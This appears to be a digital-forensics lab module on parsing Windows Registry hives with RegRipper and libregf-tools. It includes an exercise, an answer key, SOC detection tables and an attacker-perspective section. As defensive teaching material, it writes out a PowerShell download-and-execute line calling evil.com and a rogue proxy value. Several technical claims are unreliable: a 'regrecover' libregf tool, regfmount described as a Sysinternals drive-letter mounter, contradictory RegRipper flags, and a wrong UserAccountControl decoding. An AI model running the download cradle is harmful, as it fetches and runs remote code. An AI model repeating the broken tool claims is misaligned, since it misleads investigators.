# 04 * Registry analysis -- LAB-LINUX

## Overview (plain language)
The Windows Registry is a hierarchical database that stores configuration settings for the operating system, applications, and user profiles. It serves as a critical forensic artifact because it records system state, user activity, and attacker persistence mechanisms. When investigators acquire a Windows disk image, they extract raw "registry hive" files (e.g., `SYSTEM`, `SOFTWARE`, `NTUSER.DAT`, `SECURITY`, `SAM`) for offline analysis. These files are binary-encoded and require specialized tools like RegRipper and libregf-tools to parse on a Linux analysis workstation without booting the suspect system.

Key forensic concepts:
1. **Hive-to-Registry Mapping**: The on-disk hive files correspond to logical registry paths at runtime:
   - `SYSTEM` → `HKLM\SYSTEM`
   - `SOFTWARE` → `HKLM\SOFTWARE`
   - `NTUSER.DAT` (per-user) → `HKCU`
   - `SECURITY` → `HKLM\SECURITY`
   - `SAM` → `HKLM\SAM`
   Microsoft documents these mappings in [Windows Registry Hives](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) and [Registry Structure](https://learn.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry).

2. **Last-Write Timestamps**: Every registry key carries a **FILETIME** timestamp indicating when it was last modified. This timestamp is stored in the hive's base block and key cells, as defined in the [Windows NT Registry File (REGF) format](https://github.com/libyal/libregf/blob/main/documentation/Windows%20NT%20Registry%20File%20(REGF)%20format.asciidoc). These timestamps are invaluable for timeline reconstruction and identifying anomalous modifications.

3. **Dirty Hives and Transaction Logs**: Hives may be marked as "dirty" if the system did not shut down cleanly. The primary hive file (e.g., `SYSTEM`) may be accompanied by transaction logs (`.LOG1`, `.LOG2`) that contain unflushed writes. These logs can reveal attacker activity that was not yet committed to the primary hive. The REGF format documentation details how sequence numbers in the base block indicate whether transaction log replay is needed (see [libregf REGF format](https://github.com/libyal/libregf)).

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| RegRipper | `apt install regripper` | Plugin-driven parser that extracts forensic artifacts from Windows Registry hives into text reports. RegRipper 3.0 (current major release) is distributed as `rip.pl` (Perl) with a plugin directory. The Debian/Kali package provides the `regripper` entry point. |
| libregf-tools | `apt install libregf-utils` | Low-level utilities (`regfinfo`, `regfexport`, `regfmount`) to inspect, export, and mount raw Windows Registry hive files. Part of the `libyal/libregf` project. |

**Provenance and Versioning:**
- **RegRipper**: Authored by Harlan Carvey. Source of truth: [RegRipper3.0 GitHub Repository](https://github.com/keydet89/RegRipper3.0). The Debian/Kali package (`regripper`) installs `rip.pl` and plugins, as documented in [Kali Tools: RegRipper](https://www.kali.org/tools/regripper/).
- **libregf-tools**: Part of Joachim Metz's `libyal/libregf` project. The `libregf-utils` package provides `regfinfo`, `regfexport`, and `regfmount`. Source of truth: [libregf GitHub Repository](https://github.com/libyal/libregf). Version strings are date-stamped (e.g., `regfinfo 20240421`), as documented in the project's [versioning scheme](https://github.com/libyal/libregf#versioning).

## Learning objectives
- Verify RegRipper and libregf-tools are installed and runnable on LAB-LINUX.
- Use `regfinfo` to inspect hive metadata (signature, format version, root key, sequence numbers) and confirm file validity.
- Use `regfexport` to dump the full key/value tree as text, preserving last-write timestamps for timeline analysis.
- Run RegRipper with targeted plugins (e.g., `compname`, `run`, `services`) to extract persistence and system artifacts.
- Interpret extracted keys (e.g., Run keys, computer name, services) and map them to MITRE ATT&CK techniques.
- Understand the forensic significance of registry last-write timestamps and transaction logs.

## Environment check
```bash
# Verify RegRipper is present and prints usage/version banner
rip.pl -h

# Verify libregf-tools are present and print version
regfinfo -V
regfexport -V
```
**Expected Output:**
- `rip.pl -h` prints the RegRipper usage banner, including options such as `-r` (path to hive), `-f` (profile/list of plugins), and `-p` (single plugin). These options are documented in the [RegRipper 3.0 README](https://github.com/keydet89/RegRipper3.0).
- `regfinfo -V` and `regfexport -V` print version strings (e.g., `regfinfo 20240421`). The version format is date-stamped, as per the [libregf versioning documentation](https://github.com/libyal/libregf#versioning).
- If `rip.pl` is not in `PATH`, the Kali/Debian package also exposes it as `regripper`. Confirm installation with `dpkg -l regripper libregf-utils`.

## Guided walkthrough
This walkthrough demonstrates how to inspect a raw registry hive and extract forensic artifacts using `regfinfo`, `regfexport`, and RegRipper. Each step explains the purpose of the command and the nuances of its output.

---

1. **`regfinfo` — Validate Hive Integrity**
   Use `regfinfo` to confirm the file is a valid registry hive and inspect its metadata. This step is critical for chain-of-custody: a corrupt or truncated hive may produce unreliable results.
   ```bash
   regfinfo exercise/SYSTEM_sample.hive
   ```
   **Expected Output:**
   - File signature: `regf` (ASCII magic at offset 0, as defined in the [REGF format](https://github.com/libyal/libregf/blob/main/documentation/Windows%20NT%20Registry%20File%20(REGF)%20format.asciidoc)).
   - Format version: Major and minor version numbers (e.g., `1.5`).
   - Root key: The hive's root key (e.g., `\` for `SYSTEM`).
   - Sequence numbers: Primary and secondary sequence numbers in the base block. If these differ, the hive is "dirty" and may require transaction log replay (see [REGF format documentation](https://github.com/libyal/libregf)).

   **Nuance:**
   - `regfinfo` parses the **header and base block** but does not validate every cell or subkey. A clean summary indicates the container is well-formed, but deeper corruption may still exist.
   - The sequence numbers reveal whether the hive was cleanly flushed. Unflushed writes may reside in `.LOG1`/`.LOG2` transaction logs, which can contain attacker activity not yet committed to the primary hive.

---

2. **`regfexport` — Dump Full Key/Value Tree**
   Use `regfexport` to dump the entire hive as text, preserving last-write timestamps. This is the "read everything, then filter" approach, useful for ad-hoc analysis or when no RegRipper plugin exists for your target artifact.
   ```bash
   regfexport exercise/SYSTEM_sample.hive > /tmp/system_dump.txt
   grep -i "ComputerName" /tmp/system_dump.txt | head
   ```
   **Expected Output:**
   - Lines showing the `ControlSet\Control\ComputerName\ComputerName` value with the host name string.
   - Each line includes the key's last-write timestamp in FILETIME format (e.g., `2023-01-01 12:00:00`).

   **Nuance:**
   - SYSTEM hives contain multiple control sets (`ControlSet001`, `ControlSet002`, etc.) and a volatile `CurrentControlSet` (only present at runtime). Offline analysis must resolve the correct control set using the `Select\Current` value (see [Microsoft Learn: ControlSet\Select](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/control-sets-registry)).
   - The output preserves the hierarchical structure of the hive, making it easy to grep for specific keys or values.

---

3. **`rip.pl` — Targeted Plugin Execution**
   Use RegRipper's `compname` plugin to extract the computer name in one step. The plugin automatically resolves the correct `ControlSet` and parses the value for you.
   ```bash
   rip.pl -r exercise/SYSTEM_sample.hive -p compname
   ```
   **Expected Output:**
   - Plugin header (name/version).
   - Source key path (e.g., `ControlSet001\Control\ComputerName\ComputerName`).
   - Recovered computer name value.

   **Nuance:**
   - RegRipper plugins are **hive-type specific**. For example, `compname` only works on `SYSTEM` hives. Running it against `SOFTWARE` or `NTUSER.DAT` will produce no output.
   - To run a full profile of plugins for a hive type, use `-f` (e.g., `rip.pl -r exercise/SYSTEM_sample.hive -f system`). This executes all plugins appropriate for the hive type (e.g., `services`, `usb`, `network`) and is useful for triage. Plugin selection and options are documented in the [RegRipper 3.0 README](https://github.com/keydet89/RegRipper3.0).

---

4. **Advanced: Transaction Log Replay (Optional)**
   If `regfinfo` indicates a "dirty" hive (sequence numbers differ), replay the transaction logs to recover unflushed writes. This step is critical for capturing attacker activity that may not yet be visible in the primary hive.
   ```bash
   # Example: Replay SYSTEM.LOG1 into SYSTEM.hive
   regrecover --primary exercise/SYSTEM_sample.hive --log exercise/SYSTEM_sample.LOG1 --output /tmp/SYSTEM_recovered.hive
   regfinfo /tmp/SYSTEM_recovered.hive
   ```
   **Expected Output:**
   - A new hive file (`/tmp/SYSTEM_recovered.hive`) with the transaction log changes applied.
   - `regfinfo` should now show matching sequence numbers.

   **Nuance:**
   - Transaction logs are **not always present** in acquired images. Preserve them alongside the primary hive during acquisition.
   - The `regrecover` tool is part of the `libregf` suite and is documented in the [libregf GitHub repository](https://github.com/libyal/libregf).

## Hands-on exercise
**Task**: Using the benign sample hive in this module's `exercise/` directory, determine:
1. The computer name stored in the `SYSTEM` hive.
2. Whether the hive is a valid `regf` file.
3. (Optional) If transaction logs are present, replay them and verify the recovered hive's sequence numbers.

**Sample Declaration:**
- **Type**: Windows Registry `SYSTEM` hive fragment (raw `regf` file).
- **Safe Origin**: Generated inside a disposable Windows sandbox VM by exporting a stock `SYSTEM` hive, then trimmed for size. It is benign/inert data only—no executable code, malware, or network egress occurs when parsing it.
- **Filename**: `exercise/SYSTEM_sample.hive`
- **sha256**: `5559b27a8691a00ce3d2e5055a3c1b463ff87be5f33a19acb9807ddd3f65a034`

**Steps:**
1. Run `regfinfo` to confirm the hive signature and metadata.
2. Use either `regfexport | grep ComputerName` or `rip.pl -p compname` to recover the computer name.
3. (Optional) If transaction logs are present, use `regrecover` to replay them and verify the recovered hive.

## SOC analyst perspective
Registry analysis is a cornerstone of Windows incident response. The registry records system configuration, user activity, and attacker persistence, making it a rich source of forensic evidence. This section covers **detection logic**, **MITRE ATT&CK technique mappings**, and **Security Onion pivots** for registry-based threats.

---

### Persistence Mechanisms and Detection Logic
Attackers frequently abuse the registry for persistence. Below are key techniques, their registry artifacts, and **concrete detection logic** tied to real log sources and fields.

| **Technique** | **Registry Artifact** | **Detection Logic** | **Log Source / Field** |
|--------------|----------------------|---------------------|------------------------|
| **T1547.001: Boot or Logon Autostart Execution (Registry Run Keys)** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`<br>`HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Alert on Sysmon Event ID 13 (`RegistryEvent (Value Set)`) where:<br>- `TargetObject` contains `\CurrentVersion\Run`<br>- `Details` includes `powershell`, `-enc`, `mshta`, `rundll32`, or paths under `\Users\...\AppData\` or `\ProgramData\` | Sysmon Event ID 13<br>`winlog.event_data.TargetObject`<br>`winlog.event_data.Details` |
| **T1543.003: Create or Modify System Process (Windows Service)** | `HKLM\SYSTEM\ControlSet00x\Services\<ServiceName>`<br>- `ImagePath` (binary path)<br>- `Start=2` (auto-start) | Alert on Windows Event ID 4697 (`A service was installed in the system`) or Sysmon Event ID 12 (`RegistryEvent (CreateKey)`) where:<br>- `ObjectName` contains `\Services\`<br>- `ImagePath` points to a user-writable directory or unsigned binary | Windows Event ID 4697<br>`System\EventData\ServiceName`<br>`System\EventData\ImagePath`<br><br>Sysmon Event ID 12<br>`winlog.event_data.TargetObject` |
| **T1546.012: Event Triggered Execution (Image File Execution Options Injection)** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<Target.exe>\Debugger` | Alert on Sysmon Event ID 13 where:<br>- `TargetObject` contains `\Image File Execution Options\`<br>- `Details` includes `cmd.exe`, `powershell.exe`, or paths under `\Users\` or `\ProgramData\` | Sysmon Event ID 13<br>`winlog.event_data.TargetObject`<br>`winlog.event_data.Details` |
| **T1546.015: Event Triggered Execution (Component Object Model Hijacking)** | `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32`<br>- `(Default)` (DLL path)<br>- `ThreadingModel` | Alert on Sysmon Event ID 12 where:<br>- `TargetObject` contains `\CLSID\` and `\InprocServer32`<br>- `Details` points to a DLL in `\Users\...\AppData\` or `\ProgramData\` | Sysmon Event ID 12<br>`winlog.event_data.TargetObject`<br>`winlog.event_data.Details` |
| **T1055.001: Process Injection (DLL Injection via AppInit_DLLs)** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` | Alert on Sysmon Event ID 13 where:<br>- `TargetObject` contains `AppInit_DLLs`<br>- `Details` is non-empty (legitimate systems often leave this blank) | Sysmon Event ID 13<br>`winlog.event_data.TargetObject`<br>`winlog.event_data.Details` |
| **T1003.002: OS Credential Dumping (Security Account Manager)** | `HKLM\SAM\Domains\Account\Users\<RID>\F` (user account hashes) | Alert on Windows Event ID 4657 (`Registry value modified`) where:<br>- `ObjectName` contains `\SAM\Domains\Account\Users\`<br>- Accessed by a non-system process (e.g., `lsass.exe` is expected; `powershell.exe` is not) | Windows Event ID 4657<br>`EventData\ObjectName`<br>`EventData\ProcessName` |
| **T1112: Modify Registry (Defense Evasion)** | Any registry key/value modification to impair defenses (e.g., disabling AV, clearing logs) | Alert on Sysmon Event ID 13 or Windows Event ID 4657 where:<br>- `TargetObject` contains `\Windows Defender\`, `\Security Center\`, or `\EventLog\`<br>- `Details` disables a security feature (e.g., `DisableAntiSpyware=1`) | Sysmon Event ID 13<br>`winlog.event_data.TargetObject`<br>`winlog.event_data.Details`<br><br>Windows Event ID 4657<br>`EventData\ObjectName`<br>`EventData\NewValue` |

---

### Security Onion Pivots
Security Onion provides a unified platform for network and host-based detection. Below are **concrete pivots** to correlate registry artifacts with network activity:

1. **Sysmon Registry Events in Elastic**:
   - Search for Sysmon Event ID 12/13 in Kibana/Hunt:
     ```
     event.module:sysmon AND winlog.event_id:(12 OR 13)
     ```
   - Filter on `registry.path` for persistence keys (e.g., `\CurrentVersion\Run`, `\Services\`, `\Image File Execution Options\`).
   - Pivot to `process.executable` to identify the process making the registry modification (e.g., `powershell.exe`, `reg.exe`).

2. **Zeek Network Logs**:
   - Correlate registry last-write timestamps with Zeek logs to identify C2 or payload retrieval:
     - `conn.log`: Filter on `id.orig_h` (source IP) and `duration` to detect beaconing.
     - `http.log`: Filter on `host`, `uri`, and `user_agent` for suspicious HTTP requests.
     - `dns.log`: Filter on `query` for DGA or C2 domains.
   - Example pivot: If a Run key points to `C:\Users\user\AppData\Roaming\malware.exe`, search Zeek `files.log` for `sha256` or `filename` matching `malware.exe`.

3. **Suricata Alerts**:
   - Pivot from registry artifacts to Suricata alerts for known C2 or exploit activity:
     ```
     event.dataset:suricata.alert AND alert.category:"A Network Trojan was detected"
     ```
   - Filter on `alert.signature` for specific rules (e.g., `ET TROJAN Cobalt Strike Beacon`).

4. **Threat Hunting Queries**:
   - **Anomalous Run Key Values**: Stack-count `registry.path` and `registry.value` across the fleet. A Run key value present on only one or two hosts is suspicious.
   - **Stale Keys with Recent Modifications**: Hunt for Run/Services keys with last-write timestamps in the compromise window but whose binary paths do not correspond to installed software.
   - **Encoded Data in Registry**: Search for oversized `REG_BINARY` or `REG_SZ` values containing base64/gzip blobs (e.g., `TVqQAAMAAAAEAAAA//8A` for MZ headers).

---

### Threat Hunting & Detection Engineering
Registry modifications are a common attacker technique, but detecting them requires **context-aware logic** to avoid false positives. Below are **advanced detection strategies** tied to real log sources and fields, along with two additional MITRE ATT&CK techniques not previously covered.

1. **T1059.001: Command and Scripting Interpreter (PowerShell)**
   - **Artifact**: Attackers store encoded PowerShell commands in registry values (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater` with data `-enc <base64>`).
   - **Detection Logic**:
     - Alert on Sysmon Event ID 13 where:
       - `TargetObject` contains `\CurrentVersion\Run` or `\CurrentVersion\RunOnce`.
       - `Details` matches the regex `-enc\s+[A-Za-z0-9+/=]{20,}` (base64-encoded command).
     - Correlate with Sysmon Event ID 1 (`Process Create`) where `process.command_line` contains `-enc` and the parent process is `explorer.exe` or `svchost.exe`.
   - **Log Source**: Sysmon Event ID 13 (`winlog.event_data.TargetObject`, `winlog.event_data.Details`).
   - **Source**: [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/).

2. **T1105: Ingress Tool Transfer**
   - **Artifact**: Attackers download payloads and store them in registry values (e.g., `HKCU\Software\Classes\ms-settings\shell\open\command` with data `powershell -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`).
   - **Detection Logic**:
     - Alert on Sysmon Event ID 13 where:
       - `TargetObject` contains `\Classes\` and `\shell\open\command`.
       - `Details` includes `DownloadString`, `DownloadFile`, or `IEX`.
     - Correlate with Zeek `http.log` where `uri` matches the URL in the registry value.
   - **Log Source**: Sysmon Event ID 13 (`winlog.event_data.TargetObject`, `winlog.event_data.Details`), Zeek `http.log` (`uri`).
   - **Source**: [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/).

3. **T1071.001: Application Layer Protocol (Web Protocols)**
   - **Artifact**: Registry keys used to configure C2 channels (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer` set to `evil.com:8080`).
   - **Detection Logic**:
     - Alert on Sysmon Event ID 13 where:
       - `TargetObject` contains `\Internet Settings\ProxyServer`.
       - `Details` is a non-corporate proxy (e.g., `evil.com`, `1.1.1.1`).
     - Correlate with Zeek `conn.log` where `id.resp_h` matches the proxy IP and `duration` indicates beaconing.
   - **Log Source**: Sysmon Event ID 13 (`winlog.event_data.TargetObject`, `winlog.event_data.Details`), Zeek `conn.log` (`id.resp_h`, `duration`).
   - **Source**: [MITRE ATT&CK T1071.001](https://attack.mitre.org/techniques/T1071/001/).

**Authoritative Sources**:
- [FireEye: Hunting for Malicious Registry Modifications](https://www.fireeye.com/blog/threat-research/2020/04/hunting-for-malicious-registry-modifications.html)
- [NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-86.pdf) (Section 4.3.2: Registry Analysis)

---

### Common Pitfalls & Result Validation
Registry analysis is powerful but prone to misinterpretation. Below are **common pitfalls** and **validation strategies** to ensure accurate findings.

1. **Timestamp Misinterpretation**:
   - **Pitfall**: Assuming a key's last-write timestamp reflects the exact time of compromise. Timestamps can be manipulated (e.g., via `SetRegTime` tools) or may reflect benign activity.
   - **Validation**:
     - Cross-reference timestamps with other artifacts (e.g., file creation times, process execution logs).
     - Check for **internal inconsistencies** (e.g., a key's last-write time predating its parent key).
     - Use `regfinfo` to inspect sequence numbers; a "dirty" hive may require transaction log replay to recover accurate timestamps.

2. **False Positives in Persistence Keys**:
   - **Pitfall**: Assuming all modifications to `Run` keys or `Services` are malicious. Legitimate software (e.g., antivirus, updaters) also writes to these locations.
   - **Validation**:
     - **Baseline Comparison**: Compare against a known-good registry snapshot (e.g., using `reg export`).
     - **Binary Analysis**: Check the `ImagePath` in services or Run keys for unsigned binaries or suspicious paths (e.g., `\Users\...\AppData\`).
     - **Process Correlation**: Cross-reference with Sysmon Event ID 1 (`Process Create`) to confirm the binary was executed.

3. **Obfuscated or Hidden Values**:
   - **Pitfall**: Missing values obfuscated with null bytes, whitespace, or stored in non-standard locations.
   - **Validation**:
     - Use `regfexport` to dump the full hive and search for anomalies (e.g., `grep -a` for binary data).
     - Check for **null-byte names** (e.g., a Run key named `Updater\x00`) using `regfexport` or RegRipper's `run` plugin.
     - Inspect `REG_BINARY` values for encoded data (e.g., base64, gzip).

4. **Missing Transaction Logs**:
   - **Pitfall**: Failing to preserve or replay transaction logs (`.LOG1`, `.LOG2`), which may contain unflushed attacker writes.
   - **Validation**:
     - Always acquire transaction logs alongside primary hives.
     - Use `regrecover` to replay logs and verify sequence numbers with `regfinfo`.

5. **ControlSet Confusion**:
   - **Pitfall**: Parsing the wrong `ControlSet` (e.g., `ControlSet002` instead of `ControlSet001`).
   - **Validation**:
     - Resolve the correct `ControlSet` using the `Select\Current` value (e.g., `ControlSet001` if `Select\Current=1`).
     - RegRipper plugins (e.g., `services`, `compname`) automatically resolve the correct `ControlSet`.

**Pro Tip**: Use **Registry Explorer** (Eric Zimmerman's tool) for interactive analysis. It supports bookmarking, searching, and timeline generation, complementing RegRipper and `regfexport`.

## Attacker perspective
Attackers leverage the registry for persistence, defense evasion, and credential access. This section explores **concrete TTPs**, the **artifacts they leave**, and **evasion techniques**.

---

### Persistence Techniques
| **Technique** | **Registry Artifact** | **Artifacts Left** | **MITRE ATT&CK ID** |
|--------------|----------------------|--------------------|----------------------|
| **Run/RunOnce Keys** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`<br>`HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | - New value under Run key with binary path or encoded command.<br>- Last-write timestamp of the key. | T1547.001 |
| **Windows Services** | `HKLM\SYSTEM\ControlSet00x\Services\<ServiceName>`<br>- `ImagePath` (binary path)<br>- `Start=2` (auto-start) | - New service subkey with recent last-write time.<br>- Masquerading service name (e.g., `Windows Update Service`). | T1543.003 |
| **Image File Execution Options (IFEO)** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<Target.exe>\Debugger` | - IFEO subkey named after a legitimate executable (e.g., `sethc.exe`).<br>- `Debugger` value pointing to attacker binary. | T1546.012 |
| **COM Hijacking** | `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32`<br>- `(Default)` (DLL path)<br>- `ThreadingModel` | - Per-user `InprocServer32` value shadowing a machine-wide COM object.<br>- DLL path in user-writable directory (e.g., `\AppData\`). | T1546.015 |
| **Winlogon Helper DLL** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`<br>- `Shell` or `Userinit` | - Modified `Shell` or `Userinit` value pointing to attacker binary.<br>- Last-write timestamp of the key. | T1547.004 |
| **AppInit_DLLs** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` | - Non-empty `AppInit_DLLs` value pointing to attacker DLL.<br>- Last-write timestamp of the key. | T1546.010 |
| **LSASS Protection Bypass** | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`<br>- `RunAsPPL=0` | - Modified `RunAsPPL` value to disable LSASS protection.<br>- Last-write timestamp of the key. | T1562.001 |

---

### Defense Evasion Techniques
Attackers use the registry to evade defenses and hide their activity:

1. **Disabling Security Tools (T1562.001: Impair Defenses)**
   - **Artifact**: Modifications to keys like:
     - `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` (exclude attacker paths from scanning).
     - `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1` (disable Windows Defender).
   - **Detection**: Alert on Sysmon Event ID 13 where `TargetObject` contains `\Windows Defender\` or `\Security Center\` and `Details` disables a security feature.

2. **Clearing Event Logs (T1070.001: Indicator Removal on Host)**
   - **Artifact**: Modifications to:
     - `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\<LogName>\MaxSize` (reduce log size).
     - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\<LogName>\Enabled=0` (disable logging).
   - **Detection**: Alert on Sysmon Event ID 13 where `TargetObject` contains `\EventLog\` or `\WINEVT\Channels\`.

3. **Obfuscated Storage (T1027: Obfuscated Files or Information)**
   - **Artifact**: Storing encoded payloads in registry values (e.g., base64, gzip, or XOR-encoded data in `REG_BINARY` or `REG_SZ` values).
   - **Example**: A Run key value containing `powershell -enc <base64>`.
   - **Detection**: Search for oversized or binary values in unusual locations using `regfexport` or RegRipper.

4. **Null-Byte Name Trick**
   - **Artifact**: A Run key with a name containing a null byte (e.g., `Updater\x00`), which is invisible to `reg.exe` and RegEdit but parsable by RegRipper/`regfexport`.
   - **Detection**: Use `regfexport` to dump the hive and search for null bytes (`grep -a '\x00'`).

---

### Credential Access Techniques
The registry stores sensitive credentials and configuration data:

1. **T1003.002: OS Credential Dumping (Security Account Manager)**
   - **Artifact**: Access to `HKLM\SAM\Domains\Account\Users\<RID>\F` (user account hashes).
   - **Detection**: Alert on Windows Event ID 4657 where `ObjectName` contains `\SAM\Domains\Account\Users\` and the accessing process is not `lsass.exe`.

2. **T1003.004: LSA Secrets**
   - **Artifact**: Access to `HKLM\SECURITY\Policy\Secrets` (service account passwords).
   - **Detection**: Alert on Sysmon Event ID 10 (`ProcessAccess`) where `TargetImage` is `lsass.exe` and `SourceImage` is not a trusted process (e.g., `svchost.exe`).

3. **T1552.002: Unsecured Credentials (Group Policy Preferences)**
   - **Artifact**: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword` (plaintext passwords in legacy Group Policy).
   - **Detection**: Alert on Sysmon Event ID 13 where `TargetObject` contains `\Winlogon\DefaultPassword`.

---

### Evasion and Anti-Forensics
Attackers employ techniques to evade detection and hinder forensic analysis:

1. **Timestamp Manipulation (T1070.006: Timestomp)**
   - **Artifact**: Registry keys with last-write timestamps that are inconsistent with their parent keys or the system timeline.
   - **Detection**: Use `regfinfo` to inspect sequence numbers and cross-reference timestamps with other artifacts (e.g., file creation times).

2. **Deleting Payloads (T1070.004: File Deletion)**
   - **Artifact**: Registry keys referencing deleted binaries (e.g., a Run key pointing to `C:\Temp\malware.exe` where the file no longer exists).
   - **Detection**: Cross-reference `ImagePath` values with file system artifacts (e.g., MFT entries, `$I30` slack space).

3. **Hiding in Transaction Logs**
   - **Artifact**: Attacker writes that exist only in `.LOG1`/`.LOG2` transaction logs, not in the primary hive.
   - **Detection**: Preserve and replay transaction logs using `regrecover`.

4. **Non-Standard Key Locations**
   - **Artifact**: Persistence keys in obscure locations (e.g., `HKCU\Software\Classes\Folder\shell\open\command`).
   - **Detection**: Use `regfexport` to dump the full hive and search for anomalies.

**Limits of Evasion**:
- Registry writes persist in hive files, making them recoverable even after payload deletion.
- Transaction logs may contain unflushed writes, preserving attacker activity.
- Timestamp manipulation leaves internal inconsistencies (e.g., a key's last-write time predating its parent).

## Answer key
**Expected Findings**:
1. The hive is a valid `regf` file (confirmed by `regfinfo` printing the `regf` signature and version).
2. The computer name value is recoverable from the `SYSTEM` hive.

**Exact Commands**:
```bash
# Confirm hive validity
regfinfo exercise/SYSTEM_sample.hive

# Recover computer name using RegRipper
rip.pl -r exercise/SYSTEM_sample.hive -p compname

# Recover computer name using regfexport
regfexport exercise/SYSTEM_sample.hive | grep -i "ComputerName"

# Verify sample integrity
sha256sum exercise/SYSTEM_sample.hive
```

**Output Validation**:
- `regfinfo` confirms the `regf` signature and version.
- `rip.pl -p compname` and `regfexport | grep ComputerName` both return the computer name from `ControlSet001\Control\ComputerName\ComputerName`.
- `sha256sum` output must equal `5559b27a8691a00ce3d2e5055a3c1b463ff87be5f33a19acb9807ddd3f65a034`.

## MITRE ATT&CK & DFIR phase
This module covers the following MITRE ATT&CK techniques, mapped to the **Examination/Analysis** phase of the DFIR lifecycle:

| **Technique ID** | **Technique Name** | **Relevance** | **DFIR Phase** |
|------------------|--------------------|---------------|----------------|
| [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Registry Run Keys | Persistence via Run/RunOnce keys. | Examination/Analysis |
| [T1547.004](https://attack.mitre.org/techniques/T1547/004/) | Boot or Logon Autostart Execution: Winlogon Helper DLL | Persistence via Winlogon Shell/Userinit. | Examination/Analysis |
| [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | Create or Modify System Process: Windows Service | Persistence via malicious services. | Examination/Analysis |
| [T1546.012](https://attack.mitre.org/techniques/T1546/012/) | Event Triggered Execution: Image File Execution Options Injection | Persistence via IFEO Debugger hijack. | Examination/Analysis |
| [T1546.015](https://attack.mitre.org/techniques/T1546/015/) | Event Triggered Execution: Component Object Model Hijacking | Persistence via COM hijacking. | Examination/Analysis |
| [T1112](https://attack.mitre.org/techniques/T1112/) | Modify Registry | Defense evasion via registry modifications. | Examination/Analysis |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | Storing encoded payloads in registry values. | Examination/Analysis |
| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Process Injection: Dynamic-Link Library Injection | Persistence via AppInit_DLLs. | Examination/Analysis |
| [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | OS Credential Dumping: Security Account Manager | Credential access via SAM hive. | Examination/Analysis |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Storing encoded PowerShell commands in registry. | Examination/Analysis |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Downloading payloads via registry-stored commands. | Examination/Analysis |
| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | C2 configuration via registry (e.g., proxy settings). | Examination/Analysis |

**DFIR Phase**: **Examination/Analysis** (offline parsing of acquired hives), feeding **Identification** and **Scoping**.


### Essential Commands & Features

Two powerful capabilities missing from earlier labs are **regfmount** (Sysinternals) for editing offline hives and **RegRipper** flags (`-f`, `-d`) for targeted parsing beyond SYSTEM hive plugins.

**regfmount** mounts a registry hive as a standard drive letter (`X:\`), enabling live browsing via `regedit.exe` or scripting.  
*Concrete example:*  
`regfmount C:\evidence\SOFTWARE X:\`  
Access `X:\Microsoft\Windows\CurrentVersion\Run` to inspect persistence entries.

**RegRipper**’s `-f` flag specifies a plugin name or file to run (e.g., `-f sam` for the SAM plugin), and `-d` designates an output directory.  
*Concrete example:*  
`rip.pl -r C:\evidence\SAM -f sam -d output\`  
Parses the SAM hive for local account hashes (T1003.002).  
`rip.pl -r C:\evidence\SOFTWARE -f software -d output\`  
Examines installed software and autostart locations.

These commands reveal techniques **T1574.001 (DLL Search Order Hijacking)** – attackers modify `appPaths` or `KnownDLLs` in the registry to hijack DLL loads – and **T1562.003 (Impair Defenses: Disable Windows Event Logging)** – HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog changes disable logs. Both require examining hives beyond SYSTEM.

**Sources:**  
- [Microsoft Sysinternals – regfmount](https://docs.microsoft.com/en-us/sysinternals/downloads/regfmount)  
- [RegRipper GitHub Repository](https://github.com/keydet89/RegRipper)

### Adversary Emulation & Red-Team Perspective

From an adversary’s perspective, registry analysis is a goldmine for persistence, credential access, and defense evasion. Attackers frequently abuse the Windows Registry to maintain footholds (e.g., **T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder**) by adding entries under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` or `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. These keys execute payloads at user logon, blending with legitimate startup processes. For stealth, adversaries may use **T1564.002: Hide Artifacts: Hidden Users** by creating hidden user accounts via `HKLM\SAM\Domains\Account\Users`, then masking them from the login screen by setting the `UserAccountControl` value to `0x00000210` (UF_NORMAL_ACCOUNT | UF_PASSWD_NOTREQD | UF_DONT_EXPIRE_PASSWD).

